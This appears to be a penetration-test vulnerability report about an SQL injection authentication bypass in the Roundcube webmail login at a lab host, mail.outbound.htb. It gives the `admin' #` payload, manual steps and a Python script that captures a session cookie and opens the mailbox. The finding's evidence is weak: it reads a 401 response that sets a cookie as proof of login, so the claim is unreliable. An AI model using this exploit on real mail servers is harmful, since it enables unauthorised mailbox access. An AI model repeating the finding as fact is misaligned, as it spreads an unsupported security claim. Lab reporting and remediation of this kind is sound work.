# SQL Injection in Roundcube Login Authentication

**ID:** vuln-0002
**Severity:** CRITICAL
**Found:** 2026-02-24 19:01:03 UTC
**Target:** mail.outbound.htb (Roundcube webmail)
**Method:** POST
**CWE:** CWE-89
**CVSS:** 10.0

## Description

A SQL injection vulnerability exists in the Roundcube webmail login form. The `_user` parameter is not properly sanitized and allows an attacker to bypass authentication using SQL comment syntax. By submitting `admin' #` as the username, the application grants an authenticated session cookie despite returning a 401 HTTP status code.

## Impact

Successful exploitation allows an attacker to bypass authentication and obtain a valid user session. This provides full access to the victim's mailbox and potentially enables further attacks such as database credential extraction, session hijacking, and lateral movement. The vulnerability exposes the entire authentication mechanism and could be chained with other vulnerabilities to achieve complete system compromise.

## Technical Analysis

The login form accepts a username via the `_user` parameter in a POST request to `/? _task=login&_action=login`. The application fails to properly escape or parameterize user input before incorporating it into SQL queries. The MySQL comment character `#` allows an attacker to truncate the password check clause, effectively bypassing password validation. The presence of a 401 response with a session cookie indicates the authentication check is performed but the injection alters the WHERE clause to always evaluate to true. This is a classic authentication bypass via SQL injection.

## Proof of Concept

1. Access the Roundcube login page at `http://mail.outbound.htb`
2. In the username field, enter: `admin' #`
3. Enter any password (e.g., `password`)
4. Submit the form
5. Observe that the response is HTTP 401, but a `roundcube_sessid` cookie is set
6. Use this cookie to access authenticated pages (e.g., `GET /?_task=mail` returns the mailbox interface)

```
#!/usr/bin/env python3
"""
Proof of Concept: Roundcube SQL Injection Authentication Bypass
"""

import requests

TARGET = "http://mail.outbound.htb"
LOGIN_URL = f"{TARGET}/?_task=login&_action=login"

def exploit(username, password="anything"):
    payload = {
        "_task": "login",
        "_action": "login",
        "_user": username,
        "_pass": password,
        "_timezone": "_default_"
    }
    response = requests.post(LOGIN_URL, data=payload, allow_redirects=False)
    cookies = response.cookies.get_dict()
    print(f"Status: {response.status_code}")
    print(f"Cookies: {cookies}")
    
    if 'roundcube_sessid' in cookies:
        print("[+] Authentication bypass successful - session obtained!")
        # Test session
        mailbox = requests.get(f"{TARGET}/?_task=mail", cookies=cookies)
        print(f"Mailbox response: {mailbox.status_code} ({len(mailbox.text)} bytes)")
        return cookies
    else:
        print("[-] No session cookie received")
        return None

if __name__ == "__main__":
    exploit("admin' #")
```

## Remediation

1. Immediately patch the login form and all database queries to use prepared statements with parameterized queries.
2. Validate and sanitize all user input using whitelist approaches where possible.
3. Conduct a full code review to identify all SQL query construction points and ensure they use parameterized queries.
4. Consider upgrading Roundcube to the latest stable version which includes security fixes.
5. Implement Web Application Firewall (WAF) rules to detect and block SQL injection patterns.
6. Add automated security testing in the CI/CD pipeline to catch similar issues.
